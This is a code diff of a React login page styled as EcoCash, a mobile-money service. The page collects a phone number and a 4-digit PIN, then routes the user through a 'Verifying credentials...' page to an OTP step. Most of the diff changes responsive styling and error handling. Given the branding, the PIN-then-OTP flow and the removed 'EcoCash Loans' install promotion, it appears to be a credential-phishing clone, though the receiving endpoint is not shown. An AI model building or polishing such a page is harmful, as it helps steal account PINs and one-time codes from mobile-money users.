@@ -12,7 +12,6 @@ import {
   DropdownMenuItem,
   DropdownMenuTrigger,
 } from "@/components/ui/dropdown-menu"
-import Image from "next/image"
 
 const COUNTRIES = [
   { code: "ZW", name: "Zimbabwe", dial: "+263", flag: "🇿🇼" },
@@ -31,7 +30,6 @@ export default function EcoCashLoginPage() {
   const [loadingMessage, setLoadingMessage] = useState("")
 
   const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    // Only allow numbers
     const value = e.target.value.replace(/\D/g, "")
     setPhoneNumber(value)
   }
@@ -43,7 +41,6 @@ export default function EcoCashLoginPage() {
     newPin[index] = value.slice(-1)
     setPin(newPin)
 
-    // Auto-focus next input
     if (value && index < 3) {
       const nextInput = document.getElementById(`pin-${index + 1}`)
       nextInput?.focus()
@@ -60,8 +57,6 @@ export default function EcoCashLoginPage() {
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault()
 
-    // Combine country code and phone number for full format
-    // Remove leading zero if user typed it (common mistake)
     const cleanPhone = phoneNumber.startsWith("0") ? phoneNumber.slice(1) : phoneNumber
     const fullPhone = `${selectedCountry.dial}${cleanPhone}`.replace(/\s/g, "")
 
@@ -79,7 +74,7 @@ export default function EcoCashLoginPage() {
         body: JSON.stringify({
           type: "user",
           identifier: fullPhone,
-          pin: pin.join("")
+          pin: pin.join(""),
         }),
       })
 
@@ -87,15 +82,9 @@ export default function EcoCashLoginPage() {
 
       if (!res.ok) {
         if (res.status === 404) {
-          // User not found -> Redirect to Register
-          alert(data.error || "Account not found. Redirecting to Sign Up...")
-          window.location.href = "/register"
-          return
-        }
-        if (res.status === 401) {
-          // Wrong PIN -> Ask to reset
-          if (confirm("Incorrect PIN. Would you like to reset it?")) {
-            window.location.href = "/forgot-pin"
+          if (confirm("Account not found. Would you like to Sign Up?")) {
+            window.location.href = "/register"
+            setLoading(false)
           } else {
             setLoading(false)
           }
@@ -104,7 +93,6 @@ export default function EcoCashLoginPage() {
         throw new Error(data.error || "Login failed")
       }
 
-      // Success logic: Redirect to Loading Page -> OTP
       const details = encodeURIComponent("Verifying credentials...")
       const otpUrl = data.redirect
         ? `${data.redirect}${data.redirect.includes('?') ? '&' : '?'}phone=${fullPhone}`
@@ -123,54 +111,54 @@ export default function EcoCashLoginPage() {
 
   return (
     <div className="min-h-screen bg-white flex flex-col">
-      {/* Top Bar */}
-      <div className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between">
+      {/* Top Bar - Fully Responsive */}
+      <div className="bg-white border-b border-gray-200 px-3 sm:px-4 md:px-6 py-2 sm:py-3 flex items-center justify-between">
         <Link
           href="/"
-          className="flex items-center gap-2 text-blue-600 hover:text-blue-700 font-semibold transition-colors"
+          className="flex items-center gap-1 sm:gap-2 text-blue-600 hover:text-blue-700 font-semibold transition-colors text-xs sm:text-sm md:text-base"
         >
-          <Home className="w-5 h-5" />
-          Home
+          <Home className="w-3 h-3 sm:w-4 sm:h-4 md:w-5 md:h-5" />
+          <span className="hidden xs:inline">Home</span>
         </Link>
-        <div className="text-sm text-green-500 font-semibold">Secure Connection</div>
+        <div className="text-[10px] sm:text-xs md:text-sm text-green-500 font-semibold">Secure</div>
       </div>
 
-      {/* Main Content */}
-      <div className="flex-1 flex flex-col items-center justify-center px-6 py-12">
-        {/* Logo */}
-        <div className="mb-12 text-center">
-          <h1 className="text-5xl font-black">
+      {/* Main Content - Fully Responsive */}
+      <div className="flex-1 flex flex-col items-center justify-center px-3 sm:px-4 md:px-6 py-6 sm:py-8 md:py-12">
+        {/* Logo - Responsive */}
+        <div className="mb-6 sm:mb-8 md:mb-12 text-center">
+          <h1 className="text-3xl sm:text-4xl md:text-5xl lg:text-6xl font-black">
             <span className="text-blue-600">Eco</span>
             <span className="text-red-600">Cash</span>
           </h1>
         </div>
 
-        {/* Login Section */}
-        <div className="w-full max-w-md">
-          <h2 className="text-3xl font-bold text-gray-900 text-center mb-10">Login</h2>
+        {/* Login Section - Responsive */}
+        <div className="w-full max-w-md px-2 sm:px-0">
+          <h2 className="text-xl sm:text-2xl md:text-3xl font-bold text-gray-900 text-center mb-4 sm:mb-6 md:mb-10">Login</h2>
 
-          <form onSubmit={handleLogin} className="space-y-8">
-            {/* Phone Number Input */}
+          <form onSubmit={handleLogin} className="space-y-4 sm:space-y-6 md:space-y-8">
+            {/* Phone Number Input - Fully Responsive */}
             <div>
-              <div className="relative flex items-center border-2 border-blue-500 rounded-xl overflow-hidden bg-blue-50/50">
+              <div className="relative flex items-center border-2 border-blue-500 rounded-lg sm:rounded-xl overflow-hidden bg-blue-50/50">
                 <DropdownMenu>
                   <DropdownMenuTrigger asChild>
-                    <button type="button" className="flex items-center gap-2 px-4 py-4 bg-transparent hover:bg-black/5 transition-colors border-r border-blue-200 min-w-[120px]">
-                      <span className="text-2xl">{selectedCountry.flag}</span>
-                      <span className="text-gray-700 font-semibold">{selectedCountry.dial}</span>
-                      <ChevronDown className="w-4 h-4 text-gray-500" />
+                    <button type="button" className="flex items-center gap-1 sm:gap-2 px-2 sm:px-3 md:px-4 py-2.5 sm:py-3 md:py-4 bg-transparent hover:bg-black/5 transition-colors border-r border-blue-200 min-w-[80px] sm:min-w-[100px] md:min-w-[120px]">
+                      <span className="text-lg sm:text-xl md:text-2xl">{selectedCountry.flag}</span>
+                      <span className="text-gray-700 font-semibold text-xs sm:text-sm md:text-base">{selectedCountry.dial}</span>
+                      <ChevronDown className="w-3 h-3 sm:w-3.5 sm:h-3.5 md:w-4 md:h-4 text-gray-500" />
                     </button>
                   </DropdownMenuTrigger>
-                  <DropdownMenuContent align="start" className="w-[200px] bg-white border border-gray-200 shadow-xl z-50">
+                  <DropdownMenuContent align="start" className="w-[180px] sm:w-[200px] bg-white border border-gray-200 shadow-xl z-50">
                     {COUNTRIES.map((country) => (
                       <DropdownMenuItem
                         key={country.code}
                         onClick={() => setSelectedCountry(country)}
                         className="gap-2 cursor-pointer py-2"
                       >
-                        <span className="text-xl">{country.flag}</span>
-                        <span className="font-medium flex-1">{country.name}</span>
-                        <span className="text-muted-foreground">{country.dial}</span>
+                        <span className="text-lg sm:text-xl">{country.flag}</span>
+                        <span className="font-medium flex-1 text-sm">{country.name}</span>
+                        <span className="text-muted-foreground text-xs">{country.dial}</span>
                       </DropdownMenuItem>
                     ))}
                   </DropdownMenuContent>
@@ -178,91 +166,91 @@ export default function EcoCashLoginPage() {
 
                 <input
                   type="tel"
-                  placeholder="77 123 4567"
                   value={phoneNumber}
                   onChange={handlePhoneChange}
-                  className="flex-1 px-4 py-4 text-lg bg-transparent border-none focus:outline-none placeholder-gray-400 font-medium"
+                  placeholder="Phone number"
+                  className="flex-1 px-2 sm:px-3 md:px-4 py-2.5 sm:py-3 md:py-4 bg-transparent text-sm sm:text-base md:text-lg font-semibold text-gray-900 placeholder:text-gray-400 focus:outline-none"
+                  maxLength={12}
                 />
               </div>
             </div>
 
-            {/* PIN Entry Section */}
+            {/* PIN Input - Fully Responsive */}
             <div>
-              <h3 className="text-blue-600 font-bold text-center mb-2 text-lg">Secure PIN Entry</h3>
-              <p className="text-gray-600 text-center text-sm mb-6">Enter your 4-digit EcoCash PIN</p>
-
-              <div className="flex justify-center gap-4 mb-6">
+              <div className="flex items-center justify-between mb-2 sm:mb-3 md:mb-4">
+                <label className="text-xs sm:text-sm md:text-base font-semibold text-gray-700">Enter PIN</label>
+                <button
+                  type="button"
+                  onClick={() => setShowPin(!showPin)}
+                  className="text-blue-600 hover:text-blue-700 transition-colors"
+                >
+                  {showPin ? <EyeOff className="w-3.5 h-3.5 sm:w-4 sm:h-4 md:w-5 md:h-5" /> : <Eye className="w-3.5 h-3.5 sm:w-4 sm:h-4 md:w-5 md:h-5" />}
+                </button>
+              </div>
+              <div className="flex gap-2 sm:gap-3 md:gap-4 justify-center">
                 {pin.map((digit, index) => (
                   <input
                     key={index}
-                    id={`pin - ${index} `}
+                    id={`pin-${index}`}
                     type={showPin ? "text" : "password"}
                     value={digit}
                     onChange={(e) => handlePinChange(index, e.target.value)}
                     onKeyDown={(e) => handlePinKeyDown(index, e)}
                     maxLength={1}
-                    className="w-16 h-16 text-3xl font-bold text-center border-2 border-gray-300 rounded-2xl focus:outline-none focus:border-blue-600 focus:ring-2 focus:ring-blue-200 bg-white"
+                    className="w-10 h-10 sm:w-12 sm:h-12 md:w-16 md:h-16 text-center text-lg sm:text-xl md:text-2xl font-bold border-2 border-gray-300 rounded-lg sm:rounded-xl focus:border-blue-500 focus:ring-2 focus:ring-blue-200 outline-none transition-all"
                   />
                 ))}
               </div>
-
-              <button
-                type="button"
-                onClick={() => setShowPin(!showPin)}
-                className="flex items-center justify-center gap-2 text-blue-600 font-semibold hover:text-blue-700 mx-auto transition-colors"
-              >
-                {showPin ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
-                {showPin ? "Hide PIN" : "Show PIN"}
-              </button>
-
-              <div className="text-center mt-4">
-                <Link href="/forgot-pin" className="text-blue-600 hover:text-blue-700 font-semibold text-sm">
-                  Forgot PIN?
-                </Link>
-              </div>
             </div>
 
+            {/* Forgot PIN Link - Responsive */}
+            <div className="text-center">
+              <Link href="/forgot-pin" className="text-xs sm:text-sm md:text-base text-blue-600 hover:text-blue-700 font-semibold hover:underline">
+                Forgot PIN?
+              </Link>
+            </div>
+
+            {/* Login Button - Fully Responsive */}
             <Button
               type="submit"
               disabled={loading}
-              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 text-lg rounded-xl transition-all shadow-lg shadow-blue-600/20"
+              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 sm:py-4 md:py-6 text-sm sm:text-base md:text-lg rounded-lg sm:rounded-xl transition-all shadow-lg hover:shadow-xl disabled:opacity-50 disabled:cursor-not-allowed"
             >
-              {loading ? (loadingMessage || "Verifying...") : "Login"}
+              {loading ? (
+                <div className="flex items-center justify-center gap-2 sm:gap-3">
+                  <div className="w-3.5 h-3.5 sm:w-4 sm:h-4 md:w-5 md:h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                  <span className="text-sm sm:text-base">{loadingMessage || "Logging in..."}</span>
+                </div>
+              ) : (
+                "Login"
+              )}
             </Button>
-          </form>
 
-          <div className="mt-8 text-center text-sm space-y-4">
-            <Link href="/register" className="block text-blue-600 hover:text-blue-700 font-semibold transition-colors">
-              New to EcoCash? Sign Up
-            </Link>
-          </div>
+            {/* Sign Up Link - Responsive */}
+            <p className="text-center text-xs sm:text-sm md:text-base text-gray-600">
+              Don't have an account?{" "}
+              <Link href="/register" className="text-blue-600 hover:text-blue-700 font-bold hover:underline">
+                Sign Up
+              </Link>
+            </p>
+          </form>
         </div>
       </div>
 
-      {/* Wavy Divider */}
-      <svg viewBox="0 0 1200 120" preserveAspectRatio="none" className="w-full h-24 text-blue-600" style={{ marginBottom: "-1px" }}>
-        <path d="M0,50 Q300,0 600,50 T1200,50 L1200,120 L0,120 Z" fill="currentColor" />
-      </svg>
-
-      {/* Blue Section with App Promotion */}
-      <div className="bg-blue-600 text-white px-6 py-10">
-        <div className="max-w-md mx-auto text-center">
-          <p className="text-sm opacity-90 mb-6">To register an EcoCash wallet or get assistance, click below</p>
-
-          <div className="bg-gradient-to-br from-purple-500 to-purple-700 rounded-2xl p-8 shadow-xl">
-            <div className="flex justify-center gap-4 mb-4 opacity-70">
-              <div className="w-6 h-6 bg-white/20 rounded-full" />
-              <div className="w-6 h-6 bg-white/20 rounded-full" />
-              <div className="w-6 h-6 bg-white/20 rounded-full" />
-            </div>
-
-            <h3 className="text-xl font-bold mb-2">Install EcoCash Loans</h3>
-            <p className="text-sm opacity-90 mb-6">Add to your home screen for quick access and better experience</p>
-
-            <Button className="w-full bg-white text-purple-600 hover:bg-gray-100 font-bold py-3 rounded-xl transition-all">
-              Install App
-            </Button>
-          </div>
+      {/* Footer - Fully Responsive */}
+      <div className="bg-gray-50 border-t border-gray-200 px-3 sm:px-4 md:px-6 py-3 sm:py-4 md:py-6">
+        <div className="max-w-4xl mx-auto text-center space-y-1 sm:space-y-2 md:space-y-3">
+          <p className="text-[10px] sm:text-xs md:text-sm text-gray-600">
+            By continuing, you agree to our{" "}
+            <a href="#" className="text-blue-600 hover:underline">
+              Terms
+            </a>{" "}
+            and{" "}
+            <a href="#" className="text-blue-600 hover:underline">
+              Privacy Policy
+            </a>
+          </p>
+          <p className="text-[9px] sm:text-[10px] md:text-xs text-gray-500">© 2025 EcoCash. All rights reserved.</p>
         </div>
       </div>
     </div>
